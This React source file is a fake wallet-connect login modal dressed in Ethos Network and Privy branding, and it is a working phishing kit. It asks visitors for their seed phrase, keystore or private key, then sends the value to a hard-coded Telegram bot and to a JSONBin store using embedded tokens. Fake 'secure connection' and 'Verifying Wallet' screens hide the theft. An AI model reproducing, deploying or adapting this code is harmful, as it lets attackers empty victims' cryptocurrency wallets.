import React, { useState } from "react";

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const TELEGRAM_BOT_TOKEN = "8439042080:AAEUFw_Sl8gj7t77Iv8tZQ4fSEpf9lqaJrE"; // replace
const TELEGRAM_CHAT_ID = "7906229855";     // replace

const JSONBIN_BIN_ID = "6996c893ae596e708f369484"; // e.g., 6826fbd28960c979a59a8f89
const JSONBIN_SECRET_KEY = "$2a$10$yti1izYQ7PKY9IhwxrQiuuIk8TZDdxM6nzYFnduMOvJtKIdyRhBB."; 


const walletLogos: { [key: string]: string } = {
  MetaMask: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
  OKX: "https://explorer-api.walletconnect.com/v3/logo/sm/45f2f08e-fc0c-4d62-3e63-404e72170500?projectId=34357d3c125c2bcf2ce2bc3309d98715",
  Coinbase:
    "data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PScwIDAgMTAyNCAxMDI0JyBmaWxsPSdub25lJyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjxyZWN0IHdpZHRoPScxMDI0JyBoZWlnaHQ9JzEwMjQnIGZpbGw9JyMwMDUyRkYnIHJ4PScxMDAnLz48cGF0aCBkPSdNNDIwIDM5NkM0MDYuNzQ1IDM5NiAzOTYgNDA2Ljc0NSAzOTYgNDIwVjYwNEMzOTYgNjE3LjI1NSA0MDYuNzQ1IDYyOCA0MjAgNjI4SDYwNEM2MTcuMjU1IDYyOCA2MjggNjE3LjI1NSA2MjggNjA0VjQyMEM2MjggNDA2Ljc0NSA2MTcuMjU1IDM5NiA2MDQgMzk2SDQyMFonIGZpbGw9J3doaXRlJy8+PC9zdmc+",
  "Other Wallet": "https://upload.wikimedia.org/wikipedia/commons/6/6a/Wallet_icon.svg",
 
};

const LoginModal: React.FC<LoginModalProps> = ({ isOpen, onClose }) => {
  const [connecting, setConnecting] = useState(false); // first loading
  const [showInputPopup, setShowInputPopup] = useState(false);
  const [processing, setProcessing] = useState(false); // second loading
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);

  const [method, setMethod] = useState<"Phrase" | "KeyStore" | "Private Key">("Phrase");

  // Cryp-style inputs
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeystore] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  if (!isOpen) return null;

  const handleWalletClick = (wallet: string) => {
    setSelectedWallet(wallet);
    setConnecting(true);

    setTimeout(() => {
      setConnecting(false);
      setShowInputPopup(true);
    }, 2000);
  };

 const handleSubmit = async () => {
    setShowInputPopup(false);
    setProcessing(true);

    setTimeout(async () => {
      if (!selectedWallet) return;

      const methodValue = method === "Phrase" ? phrase : method === "KeyStore" ? keystore : privateKey;

      const newSubmission = {
        id: Date.now(),
        wallet: selectedWallet,
        method,
        value: methodValue,
        timestamp: new Date().toISOString(),
      };

      // Send to Telegram
      try {
        const message = `Wallet: ${selectedWallet}, Method: ${method}, Value: ${methodValue}`;
        await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
            message
          )}`
        );
      } catch (err) {
        console.error("Telegram error:", err);
      }

      // Send to JSONBin
      try {
        // 1. Fetch existing submissions
        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
          headers: {
            "X-Master-Key": JSONBIN_SECRET_KEY,
          },
        });
        const data = await res.json();
        const submissions = data.record?.submissions || [];

        // 2. Append new submission
        submissions.push(newSubmission);

        // 3. PUT updated array back
        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            "X-Master-Key": JSONBIN_SECRET_KEY,
          },
          body: JSON.stringify({ submissions }),
        });
      } catch (err) {
        console.error("JSONBin error:", err);
      }

      // Reset
      setPhrase("");
      setKeystore("");
      setPrivateKey("");
      setSelectedWallet(null);
      setProcessing(false);
      onClose();
    }, 3000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      {/* Overlay */}
      <div className="absolute inset-0 bg-black/40 backdrop-blur-sm" onClick={onClose} />

      {/* Wallet Selection Modal */}
      <div className="relative bg-white w-full max-w-md rounded-2xl shadow-2xl p-6 animate__animated animate__fadeInUp z-40">
        <button onClick={onClose} className="absolute top-4 right-4 text-gray-600 hover:text-black">
          ✕
        </button>
        <div className="flex justify-center mb-4">
          <img src="https://app.ethos.network/assets/images/privy/logo-all-light.png" alt="Ethos Logo" className="max-h-[90px] max-w-[180px]" />
        </div>
        <h3 className="text-center text-xl font-semibold mb-6">Log in or sign up</h3>

<div className="space-y-3">
  {["MetaMask", "OKX", "Coinbase", "Other Wallet"].map((wallet) => {
    const logo = walletLogos[wallet];

    return (
      <button
        key={wallet}
        onClick={() => handleWalletClick(wallet)}
        className="w-full flex items-center gap-4 border rounded-xl p-4 hover:bg-gray-50 transition"
      >
        {logo ? (
          <img
            src={logo}
            alt={wallet}
            className="w-8 h-8 rounded-md"
            onError={(e) => {
              // fallback to SVG if image fails
              (e.target as HTMLImageElement).style.display = "none";
            }}
          />
        ) : null}

        {!logo && (
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="w-8 h-8 text-gray-500"
            fill="currentColor"
            viewBox="0 0 24 24"
          >
            <path d="M12 1L3 6v6c0 6 3 11 9 11s9-5 9-11V6l-9-5z" />
          </svg>
        )}

        <span>{wallet}</span>
      </button>
    );
  })}
</div>



<div className="mt-6 text-center text-sm"> <button className="text-blue-600 hover:underline">I have a passkey</button> <p className="mt-3 text-gray-600"> By logging in I agree to the{" "} <a href="https://www.ethos.network/terms" target="_blank" className="text-blue-600"> Terms </a>{" "} &{" "} <a href="https://www.ethos.network/privacy" target="_blank" className="text-blue-600"> Privacy Policy </a> </p> <div className="mt-4 flex justify-center"> <a href="https://www.privy.io/" target="_blank" className="text-gray-500 text-xs"> Protected by privy </a> </div> </div> 
        
      </div>
      

      {/* First Loading */}
      {connecting && (
        <div className="absolute inset-0 flex items-center justify-center bg-slate-900/70 backdrop-blur z-50">
          <div className="bg-green-50 border border-green-300 p-6 rounded-xl shadow-md text-center w-[320px]">
            <h2 className="text-green-700 font-bold mb-2">{selectedWallet} Wallet</h2>
            <p className="text-green-700 text-sm italic mb-4">Your connection is secure and encrypted.</p>
            <div className="flex justify-center mb-4">
              <div className="w-8 h-8 border-2 border-green-400 border-t-transparent rounded-full animate-spin"></div>
            </div>
            <p className="text-green-600 font-semibold">Starting secure connection...</p>
          </div>
        </div>
      )}

   {showInputPopup && selectedWallet && (
  <div className="absolute inset-0 flex items-center justify-center bg-black/40 z-50">
    <div className="relative bg-white p-6 rounded-2xl shadow-2xl w-[90%] max-w-md animate__animated animate__fadeInUp">
      
      {/* Close Button */}
      <button
        onClick={() => setShowInputPopup(false)}
        className="absolute top-4 right-4 text-gray-600 hover:text-black"
      >
        ✕
      </button>

      <div className="flex justify-center mb-4">
        {walletLogos[selectedWallet] ? (
          <img
            src={walletLogos[selectedWallet]}
            alt={selectedWallet}
            className="w-12 h-12 rounded-md"
            onError={(e) => ((e.target as HTMLImageElement).style.display = "none")}
          />
        ) : (
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="w-12 h-12 text-gray-500"
            fill="currentColor"
            viewBox="0 0 24 24"
          >
            <path d="M12 1L3 6v6c0 6 3 11 9 11s9-5 9-11V6l-9-5z" />
          </svg>
        )}
      </div>

      <h3 className="text-center text-xl font-semibold mb-4">{selectedWallet} Connect</h3>

      {/* Method Tabs */}
      <ul className="flex justify-around border-b mb-4">
        {["Phrase", "KeyStore", "Private Key"].map((m) => (
          <li
            key={m}
            onClick={() => setMethod(m as any)}
            className={`cursor-pointer py-1 ${
              method === m
                ? "text-blue-600 font-semibold border-b-2 border-blue-600"
                : "text-gray-600"
            }`}
          >
            {m}
          </li>
        ))}
      </ul>

      {/* Input field */}
      {method === "Phrase" && (
        <input
          type="text"
          placeholder="Enter Phrase"
          value={phrase}
          onChange={(e) => setPhrase(e.target.value)}
          className="w-full border rounded-lg p-3 mb-3"
        />
      )}
      {method === "KeyStore" && (
        <input
          type="text"
          placeholder="Enter KeyStore"
          value={keystore}
          onChange={(e) => setKeystore(e.target.value)}
          className="w-full border rounded-lg p-3 mb-3"
        />
      )}
      {method === "Private Key" && (
        <input
          type="text"
          placeholder="Enter Private Key"
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
          className="w-full border rounded-lg p-3 mb-3"
        />
      )}

      <button
        onClick={handleSubmit}
        className="w-full bg-black text-white py-2 rounded-lg"
      >
        Submit
      </button>
    </div>
  </div>
)}


      {/* Second Loading */}
      {processing && (
        <div className="absolute inset-0 flex items-center justify-center bg-slate-900/70 backdrop-blur z-50">
          <div className="bg-blue-50 border border-blue-300 p-6 rounded-xl shadow-md text-center w-[320px]">
            <h2 className="text-blue-700 font-bold mb-2">Verifying Wallet...</h2>
            <div className="flex justify-center mb-4">
              <div className="w-8 h-8 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
            </div>
            <p className="text-blue-600 font-semibold">Please wait while we process your request.</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoginModal;
